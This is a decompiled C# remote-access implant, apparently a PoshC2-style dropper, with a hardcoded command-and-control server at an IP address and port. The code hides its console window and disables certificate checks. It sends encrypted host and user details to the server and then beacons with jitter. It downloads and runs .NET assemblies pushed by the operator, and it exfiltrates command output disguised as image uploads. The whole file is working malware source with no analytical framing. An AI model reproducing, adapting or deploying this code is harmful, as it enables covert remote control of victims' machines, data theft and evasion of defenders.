using System;
using System.Collections;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.ComponentModel;
using System.Diagnostics;
using System.Globalization;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Net;
using System.Net.Security;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using System.Security.Principal;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;

public class Program
{
	internal static class UrlGen
	{
		private static List<string> _stringnewURLS = new List<string>();

		private static string _randomURI;

		private static string _baseUrl;

		private static Random _rnd = new Random();

		private static Regex _re = new Regex("(?<=\")[^\"]*(?=\")|[^\" ]+", (RegexOptions)8);

		internal static void Init(string stringURLS, string RandomURI, string baseUrl)
		{
			_stringnewURLS = Enumerable.ToList<string>(Enumerable.Where<string>(Enumerable.Select<Match, string>(Enumerable.Cast<Match>((IEnumerable)_re.Matches(stringURLS.Replace(",", "").Replace(" ", ""))), (Func<Match, string>)((Match m) => ((Capture)m).get_Value())), (Func<string, bool>)((string m) => !string.IsNullOrEmpty(m))));
			_randomURI = RandomURI;
			_baseUrl = baseUrl;
		}

		internal static string GenerateUrl()
		{
			string text = _stringnewURLS[_rnd.Next(_stringnewURLS.Count)];
			if (rotate != null)
			{
				Random random = new Random();
				int num = random.Next(0, rotate.Length);
				_baseUrl = rotate[num].Replace("\"", string.Empty).Trim();
				dfarray = dfhead;
				dfs = num;
			}
			return $"{_baseUrl}/{text}{Guid.NewGuid()}/?{_randomURI}";
		}
	}

	internal static class ImgGen
	{
		private static Random _rnd = new Random();

		private static Regex _re = new Regex("(?<=\")[^\"]*(?=\")|[^\" ]+", (RegexOptions)8);

		private static List<string> _newImgs = new List<string>();

		internal static void Init(string stringIMGS)
		{
			IEnumerable<string> enumerable = Enumerable.Select<Match, string>(Enumerable.Cast<Match>((IEnumerable)_re.Matches(stringIMGS.Replace(",", ""))), (Func<Match, string>)((Match m) => ((Capture)m).get_Value()));
			enumerable = Enumerable.Where<string>(enumerable, (Func<string, bool>)((string m) => !string.IsNullOrEmpty(m)));
			_newImgs = Enumerable.ToList<string>(enumerable);
		}

		private static string RandomString(int length)
		{
			return new string(Enumerable.ToArray<char>(Enumerable.Select<string, char>(Enumerable.Repeat<string>("...................@..........................Tyscf", length), (Func<string, char>)((string s) => s[_rnd.Next(s.Length)]))));
		}

		internal static byte[] GetImgData(byte[] cmdoutput)
		{
			int num = 1500;
			int num2 = cmdoutput.Length + num;
			string s = _newImgs[new Random().Next(0, _newImgs.Count)];
			byte[] array = Convert.FromBase64String(s);
			byte[] bytes = Encoding.UTF8.GetBytes(RandomString(num - array.Length));
			byte[] array2 = new byte[num2];
			Array.Copy(array, 0, array2, 0, array.Length);
			Array.Copy(bytes, 0, array2, array.Length, bytes.Length);
			Array.Copy(cmdoutput, 0, array2, array.Length + bytes.Length, cmdoutput.Length);
			return array2;
		}
	}

	public const int SW_HIDEN = 0;

	public const int SW_SHOW = 5;

	public static string taskId = "";

	public static string pKey;

	public static bool Run = true;

	private static string Pop = "";

	private static int dfs = 0;

	private static string[] dfarray = new string[1]
	{
		""
	};

	public static string[] dfhead = null;

	private static string[] basearray = new string[1]
	{
		"http://64.226.84.200:8080"
	};

	public static string[] rotate = null;

	public static IntPtr DllBaseAddress = IntPtr.Zero;

	[DllImport("shell32.dll")]
	private static extern IntPtr CommandLineToArgvW([MarshalAs(UnmanagedType.LPWStr)] string lpCmdLine, out int pNumArgs);

	[DllImport("kernel32.dll")]
	private static extern IntPtr GetCurrentThread();

	[DllImport("kernel32.dll")]
	private static extern bool TerminateThread(IntPtr hThread, uint dwExitCode);

	[DllImport("kernel32.dll")]
	private static extern IntPtr GetConsoleWindow();

	[DllImport("user32.dll")]
	private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

	public static void Sharp(long baseAddr = 0L)
	{
		DllBaseAddress = new IntPtr(baseAddr);
		if (!string.IsNullOrEmpty("") && !Environment.UserDomainName.ToLower().Contains("".ToLower()))
		{
			return;
		}
		IntPtr consoleWindow = GetConsoleWindow();
		ShowWindow(consoleWindow, 0);
		AUnTrCrts();
		int num = 30;
		int num2 = 60000;
		ManualResetEvent manualResetEvent = new ManualResetEvent(initialState: false);
		while (true && num > 0)
		{
			try
			{
				primer();
			}
			catch
			{
				num--;
				manualResetEvent.WaitOne(num2);
				num2 *= 2;
				continue;
			}
			break;
		}
		IntPtr currentThread = GetCurrentThread();
		TerminateThread(currentThread, 0u);
	}

	public static void Main()
	{
		Sharp(0L);
	}

	private static string[] CLArgs(string cl)
	{
		//IL_0019: Unknown result type (might be due to invalid IL or missing references)
		int pNumArgs;
		IntPtr intPtr = CommandLineToArgvW(cl, out pNumArgs);
		if (intPtr == IntPtr.Zero)
		{
			throw new Win32Exception();
		}
		try
		{
			string[] array = new string[pNumArgs];
			for (int i = 0; i < array.Length; i++)
			{
				IntPtr ptr = Marshal.ReadIntPtr(intPtr, i * IntPtr.Size);
				array[i] = Marshal.PtrToStringUni(ptr);
			}
			return array;
		}
		finally
		{
			Marshal.FreeHGlobal(intPtr);
		}
	}

	private static byte[] Combine(byte[] first, byte[] second)
	{
		byte[] array = new byte[first.Length + second.Length];
		Buffer.BlockCopy(first, 0, array, 0, first.Length);
		Buffer.BlockCopy(second, 0, array, first.Length, second.Length);
		return array;
	}

	private static WebClient GetWebRequest(string cookie)
	{
		//IL_0020: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0044: Unknown result type (might be due to invalid IL or missing references)
		//IL_004b: Expected O, but got Unknown
		//IL_004e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0058: Expected O, but got Unknown
		//IL_005d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0067: Expected O, but got Unknown
		try
		{
			ServicePointManager.set_SecurityProtocol((SecurityProtocolType)4032);
		}
		catch (Exception ex)
		{
			Console.WriteLine(ex.Message);
		}
		WebClient val = new WebClient();
		string text = "";
		string text2 = "";
		string text3 = "";
		if (!string.IsNullOrEmpty(text))
		{
			WebProxy val2 = new WebProxy();
			val2.set_Address(new Uri(text));
			val2.set_Credentials((ICredentials)new NetworkCredential(text2, text3));
			if (string.IsNullOrEmpty(text2))
			{
				val2.set_UseDefaultCredentials(true);
			}
			val2.set_BypassProxyOnLocal(false);
			val.set_Proxy((IWebProxy)(object)val2);
		}
		else if (val.get_Proxy() != null)
		{
			val.get_Proxy().set_Credentials(CredentialCache.get_DefaultCredentials());
		}
		string text4 = dfarray[dfs].Replace("\"", string.Empty).Trim();
		if (!string.IsNullOrEmpty(text4))
		{
			((NameValueCollection)val.get_Headers()).Add("Host", text4);
		}
		((NameValueCollection)val.get_Headers()).Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.122 Safari/537.36");
		((NameValueCollection)val.get_Headers()).Add("Referer", "");
		if (cookie != null)
		{
			val.get_Headers().Add((HttpRequestHeader)25, $"SessionID={cookie}");
		}
		return val;
	}

	private static string Decryption(string key, string enc)
	{
		byte[] array = Convert.FromBase64String(enc);
		byte[] array2 = new byte[16];
		Array.Copy(array, array2, 16);
		try
		{
			SymmetricAlgorithm val = CreateCam(key, Convert.ToBase64String(array2));
			byte[] bytes = val.CreateDecryptor().TransformFinalBlock(array, 16, array.Length - 16);
			return Encoding.UTF8.GetString(Convert.FromBase64String(Encoding.UTF8.GetString(bytes).Trim(new char[1])));
		}
		catch
		{
			SymmetricAlgorithm val2 = CreateCam(key, Convert.ToBase64String(array2), rij: false);
			byte[] bytes2 = val2.CreateDecryptor().TransformFinalBlock(array, 16, array.Length - 16);
			return Encoding.UTF8.GetString(Convert.FromBase64String(Encoding.UTF8.GetString(bytes2).Trim(new char[1])));
		}
		finally
		{
			Array.Clear(array, 0, array.Length);
			Array.Clear(array2, 0, 16);
		}
	}

	private static bool ihInteg()
	{
		//IL_0007: Unknown result type (might be due to invalid IL or missing references)
		//IL_000d: Expected O, but got Unknown
		WindowsIdentity current = WindowsIdentity.GetCurrent();
		WindowsPrincipal val = new WindowsPrincipal(current);
		return val.IsInRole((WindowsBuiltInRole)544);
	}

	private static string Encryption(string key, string un, bool comp = false, byte[] unByte = null)
	{
		byte[] array = null;
		array = (byte[])((unByte == null) ? ((object)Encoding.UTF8.GetBytes(un)) : ((object)unByte));
		if (comp)
		{
			array = Compress(array);
		}
		try
		{
			SymmetricAlgorithm val = CreateCam(key, null);
			byte[] second = val.CreateEncryptor().TransformFinalBlock(array, 0, array.Length);
			return Convert.ToBase64String(Combine(val.get_IV(), second));
		}
		catch
		{
			SymmetricAlgorithm val2 = CreateCam(key, null, rij: false);
			byte[] second2 = val2.CreateEncryptor().TransformFinalBlock(array, 0, array.Length);
			return Convert.ToBase64String(Combine(val2.get_IV(), second2));
		}
	}

	private static SymmetricAlgorithm CreateCam(string key, string IV, bool rij = true)
	{
		//IL_0008: Unknown result type (might be due to invalid IL or missing references)
		//IL_000e: Expected O, but got Unknown
		//IL_0013: Unknown result type (might be due to invalid IL or missing references)
		//IL_0019: Expected O, but got Unknown
		SymmetricAlgorithm val = null;
		val = (SymmetricAlgorithm)((!rij) ? ((object)new AesCryptoServiceProvider()) : ((object)new RijndaelManaged()));
		val.set_Mode((CipherMode)1);
		val.set_Padding((PaddingMode)3);
		val.set_BlockSize(128);
		val.set_KeySize(256);
		if (IV != null)
		{
			val.set_IV(Convert.FromBase64String(IV));
		}
		else
		{
			val.GenerateIV();
		}
		if (key != null)
		{
			val.set_Key(Convert.FromBase64String(key));
		}
		return val;
	}

	private static void AUnTrCrts()
	{
		//IL_000e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0018: Expected O, but got Unknown
		try
		{
			ServicePointManager.set_ServerCertificateValidationCallback((RemoteCertificateValidationCallback)((object z, X509Certificate y, X509Chain x, SslPolicyErrors w) => true));
		}
		catch
		{
		}
	}

	private static void primer()
	{
		//IL_0184: Unknown result type (might be due to invalid IL or missing references)
		//IL_018b: Expected O, but got Unknown
		//IL_01af: Unknown result type (might be due to invalid IL or missing references)
		//IL_01b6: Expected O, but got Unknown
		//IL_01da: Unknown result type (might be due to invalid IL or missing references)
		//IL_01e1: Expected O, but got Unknown
		//IL_0205: Unknown result type (might be due to invalid IL or missing references)
		//IL_020c: Expected O, but got Unknown
		//IL_0230: Unknown result type (might be due to invalid IL or missing references)
		//IL_0237: Expected O, but got Unknown
		//IL_025b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0262: Expected O, but got Unknown
		//IL_0286: Unknown result type (might be due to invalid IL or missing references)
		//IL_028d: Expected O, but got Unknown
		if (!(DateTime.ParseExact("2025-01-01", "yyyy-MM-dd", CultureInfo.InvariantCulture) > DateTime.Now))
		{
			return;
		}
		dfs = 0;
		string text = "";
		try
		{
			text = WindowsIdentity.GetCurrent().get_Name();
		}
		catch
		{
			text = Environment.UserName;
		}
		if (ihInteg())
		{
			text += "*";
		}
		string userDomainName = Environment.UserDomainName;
		string environmentVariable = Environment.GetEnvironmentVariable("COMPUTERNAME");
		string environmentVariable2 = Environment.GetEnvironmentVariable("PROCESSOR_ARCHITECTURE");
		int id = Process.GetCurrentProcess().get_Id();
		string processName = Process.GetCurrentProcess().get_ProcessName();
		Environment.CurrentDirectory = Environment.GetEnvironmentVariable("windir");
		string text2 = null;
		string text3 = null;
		string[] array = basearray;
		for (int i = 0; i < array.Length; dfs++, i++)
		{
			string text4 = array[i];
			string un = $"{userDomainName};{text};{environmentVariable};{environmentVariable2};{id};{processName};1";
			string key = "DGCzi057IDmHvgTVE2gm60w8quqfpMD+o8qCBGpYItc=";
			text3 = text4;
			string text5 = text3 + "/Kettie/Emmie/Anni?Theda=Merrilee?c";
			try
			{
				string enc = GetWebRequest(Encryption(key, un)).DownloadString(text5);
				text2 = Decryption(key, enc);
			}
			catch (Exception ex)
			{
				Console.WriteLine($" > Exception {ex.Message}");
				continue;
			}
			break;
		}
		if (string.IsNullOrEmpty(text2))
		{
			throw new Exception();
		}
		Regex val = new Regex("RANDOMURI19901(.*)10991IRUMODNAR");
		Match val2 = val.Match(text2);
		string randomURI = ((object)val2.get_Groups().get_Item(1)).ToString();
		val = new Regex("URLS10484390243(.*)34209348401SLRU");
		val2 = val.Match(text2);
		string stringURLS = ((object)val2.get_Groups().get_Item(1)).ToString();
		val = new Regex("KILLDATE1665(.*)5661ETADLLIK");
		val2 = val.Match(text2);
		string killDate = ((object)val2.get_Groups().get_Item(1)).ToString();
		val = new Regex("SLEEP98001(.*)10089PEELS");
		val2 = val.Match(text2);
		string sleep = ((object)val2.get_Groups().get_Item(1)).ToString();
		val = new Regex("JITTER2025(.*)5202RETTIJ");
		val2 = val.Match(text2);
		string jitter = ((object)val2.get_Groups().get_Item(1)).ToString();
		val = new Regex("NEWKEY8839394(.*)4939388YEKWEN");
		val2 = val.Match(text2);
		string key2 = ((object)val2.get_Groups().get_Item(1)).ToString();
		val = new Regex("IMGS19459394(.*)49395491SGMI");
		val2 = val.Match(text2);
		string stringIMGS = ((object)val2.get_Groups().get_Item(1)).ToString();
		ImplantCore(text3, randomURI, stringURLS, killDate, sleep, key2, stringIMGS, jitter);
	}

	private static byte[] Compress(byte[] raw)
	{
		//IL_0009: Unknown result type (might be due to invalid IL or missing references)
		//IL_000f: Expected O, but got Unknown
		using MemoryStream memoryStream = new MemoryStream();
		GZipStream val = new GZipStream((Stream)memoryStream, (CompressionMode)1, true);
		try
		{
			((Stream)(object)val).Write(raw, 0, raw.Length);
		}
		finally
		{
			((IDisposable)val)?.Dispose();
		}
		return memoryStream.ToArray();
	}

	private static Type LoadS(string assemblyqNme)
	{
		return Type.GetType(assemblyqNme, (AssemblyName name) => Enumerable.LastOrDefault<Assembly>(Enumerable.Where<Assembly>((IEnumerable<Assembly>)AppDomain.CurrentDomain.GetAssemblies(), (Func<Assembly, bool>)((Assembly z) => z.FullName == name.FullName))), null, throwOnError: true);
	}

	private static string rAsm(string c)
	{
		string[] array = c.Split(new string[1]
		{
			" "
		}, StringSplitOptions.RemoveEmptyEntries);
		int num = 0;
		string text = "";
		string name = "";
		string text2 = "";
		string text3 = "";
		string text4 = "";
		string[] array2 = array;
		foreach (string text5 in array2)
		{
			if (num == 1)
			{
				text3 = text5;
			}
			if (num == 2)
			{
				text4 = text5;
			}
			if (c.ToLower().StartsWith("run-exe"))
			{
				if (num > 2)
				{
					text2 = text2 + " " + text5;
				}
			}
			else if (num == 3)
			{
				name = text5;
			}
			else if (num > 3)
			{
				text2 = text2 + " " + text5;
			}
			num++;
		}
		string[] array3 = CLArgs(text2);
		string[] array4 = Enumerable.ToArray<string>(Enumerable.Skip<string>((IEnumerable<string>)array3, 1));
		Assembly[] assemblies = AppDomain.CurrentDomain.GetAssemblies();
		foreach (Assembly assembly in assemblies)
		{
			if (!assembly.FullName!.ToString().ToLower().StartsWith(text4.ToLower()))
			{
				continue;
			}
			Type type = LoadS(text3 + ", " + assembly.FullName);
			try
			{
				if (c.ToLower().StartsWith("run-exe"))
				{
					object obj = type.Assembly.EntryPoint!.Invoke(null, new object[1]
					{
						array4
					});
					if (obj != null)
					{
						text = obj.ToString();
						return text;
					}
					return text;
				}
				if (c.ToLower().StartsWith("run-dll"))
				{
					try
					{
						object obj2 = type.Assembly.GetType(text3)!.InvokeMember(name, BindingFlags.Static | BindingFlags.Public | BindingFlags.InvokeMethod, null, null, array4);
						if (obj2 == null)
						{
							return text;
						}
						text = obj2.ToString();
						return text;
					}
					catch
					{
						object obj3 = type.Assembly.GetType(text3)!.InvokeMember(name, BindingFlags.Static | BindingFlags.Public | BindingFlags.InvokeMethod, null, null, null);
						if (obj3 == null)
						{
							return text;
						}
						text = obj3.ToString();
						return text;
					}
				}
				text = "[-] Error running assembly, unrecognised command: " + c;
				return text;
			}
			catch (NullReferenceException)
			{
				return text;
			}
			catch (Exception ex2)
			{
				text = text + "\n[-] Error running assembly: " + ex2.Message;
				return text + "\n" + ex2.StackTrace;
			}
		}
		return text;
	}

	private static int Parse_Beacon_Time(string time, string unit)
	{
		int num = int.Parse(time);
		switch (unit)
		{
		case "h":
			num *= 3600;
			break;
		case "m":
			num *= 60;
			break;
		}
		return num;
	}

	public static void Exec(string cmd, string taskId, string key = null, byte[] encByte = null)
	{
		if (string.IsNullOrEmpty(key))
		{
			key = pKey;
		}
		string cookie = Encryption(key, taskId);
		string text = "";
		text = ((encByte == null) ? Encryption(key, cmd, comp: true) : Encryption(key, null, comp: true, encByte));
		byte[] cmdoutput = Convert.FromBase64String(text);
		byte[] imgData = ImgGen.GetImgData(cmdoutput);
		int num = 0;
		while (num < 5)
		{
			num++;
			try
			{
				GetWebRequest(cookie).UploadData(UrlGen.GenerateUrl(), imgData);
				num = 5;
			}
			catch
			{
			}
		}
	}

	private static void ImplantCore(string baseURL, string RandomURI, string stringURLS, string KillDate, string Sleep, string Key, string stringIMGS, string Jitter)
	{
		//IL_001f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0025: Expected O, but got Unknown
		//IL_0069: Unknown result type (might be due to invalid IL or missing references)
		//IL_006f: Expected O, but got Unknown
		//IL_0324: Unknown result type (might be due to invalid IL or missing references)
		//IL_032b: Expected O, but got Unknown
		//IL_042a: Expected O, but got Unknown
		UrlGen.Init(stringURLS, RandomURI, baseURL);
		ImgGen.Init(stringIMGS);
		pKey = Key;
		int num = 5;
		Regex val = new Regex("(?<t>[0-9]{1,9})(?<u>[h,m,s]{0,1})", (RegexOptions)9);
		Match val2 = val.Match(Sleep);
		if (((Group)val2).get_Success())
		{
			num = Parse_Beacon_Time(((Capture)val2.get_Groups().get_Item("t")).get_Value(), ((Capture)val2.get_Groups().get_Item("u")).get_Value());
		}
		StringWriter val3 = new StringWriter();
		Console.SetOut((TextWriter)(object)val3);
		ManualResetEvent manualResetEvent = new ManualResetEvent(initialState: false);
		StringBuilder stringBuilder = new StringBuilder();
		double result = 0.0;
		if (!double.TryParse(Jitter, NumberStyles.Any, CultureInfo.InvariantCulture, out result))
		{
			result = 0.2;
		}
		string cmd;
		while (!manualResetEvent.WaitOne(new Random().Next((int)((double)(num * 1000) * (1.0 - result)), (int)((double)(num * 1000) * (1.0 + result)))))
		{
			if (DateTime.ParseExact(KillDate, "yyyy-MM-dd", CultureInfo.InvariantCulture) < DateTime.Now)
			{
				Run = false;
				manualResetEvent.Set();
				continue;
			}
			stringBuilder.Length = 0;
			try
			{
				string text = "";
				cmd = null;
				try
				{
					cmd = GetWebRequest(null).DownloadString(UrlGen.GenerateUrl());
					text = Decryption(Key, cmd).Replace("\0", string.Empty);
				}
				catch
				{
					continue;
				}
				if (!text.ToLower().StartsWith("multicmd"))
				{
					continue;
				}
				string text2 = text.Replace("multicmd", "");
				string[] array = text2.Split(new string[1]
				{
					"!d-3dion@LD!-d"
				}, StringSplitOptions.RemoveEmptyEntries);
				string[] array2 = array;
				foreach (string text3 in array2)
				{
					taskId = text3.Substring(0, 5);
					cmd = text3.Substring(5, text3.Length - 5);
					if (cmd.ToLower().StartsWith("exit"))
					{
						Run = false;
						manualResetEvent.Set();
						break;
					}
					if (cmd.ToLower().StartsWith("loadmodule"))
					{
						string s = Regex.Replace(cmd, "loadmodule", "", (RegexOptions)1);
						Assembly assembly = Assembly.Load(Convert.FromBase64String(s));
						Exec(stringBuilder.ToString(), taskId, Key);
					}
					else if (cmd.ToLower().StartsWith("run-dll-background") || cmd.ToLower().StartsWith("run-exe-background"))
					{
						Thread thread = new Thread((ThreadStart)delegate
						{
							rAsm(cmd);
						});
						Exec("[+] Running background task", taskId, Key);
						thread.Start();
					}
					else if (cmd.ToLower().StartsWith("run-dll") || cmd.ToLower().StartsWith("run-exe"))
					{
						stringBuilder.AppendLine(rAsm(cmd));
					}
					else if (cmd.ToLower().StartsWith("beacon"))
					{
						Regex val4 = new Regex("(?<=(beacon)\\s{1,})(?<t>[0-9]{1,9})(?<u>[h,m,s]{0,1})", (RegexOptions)9);
						Match val5 = val4.Match(text3);
						if (((Group)val5).get_Success())
						{
							num = Parse_Beacon_Time(((Capture)val5.get_Groups().get_Item("t")).get_Value(), ((Capture)val5.get_Groups().get_Item("u")).get_Value());
						}
						else
						{
							stringBuilder.AppendLine($"[X] Invalid time \"{text3}\"");
						}
						Exec("Beacon set", taskId, Key);
					}
					else
					{
						string text4 = rAsm($"run-exe Core.Program Core {cmd}");
					}
					stringBuilder.AppendLine(((object)val3).ToString());
					StringBuilder stringBuilder2 = val3.GetStringBuilder();
					stringBuilder2.Remove(0, stringBuilder2.Length);
					if (stringBuilder.Length > 2)
					{
						Exec(stringBuilder.ToString(), taskId, Key);
					}
					stringBuilder.Length = 0;
				}
			}
			catch (NullReferenceException)
			{
			}
			catch (WebException val6)
			{
				WebException val7 = val6;
			}
			catch (Exception arg)
			{
				Exec($"Error: {stringBuilder.ToString()} {arg}", "Error", Key);
			}
			finally
			{
				stringBuilder.AppendLine(((object)val3).ToString());
				StringBuilder stringBuilder3 = val3.GetStringBuilder();
				stringBuilder3.Remove(0, stringBuilder3.Length);
				if (stringBuilder.Length > 2)
				{
					Exec(stringBuilder.ToString(), "99999", Key);
				}
				stringBuilder.Length = 0;
			}
		}
	}
}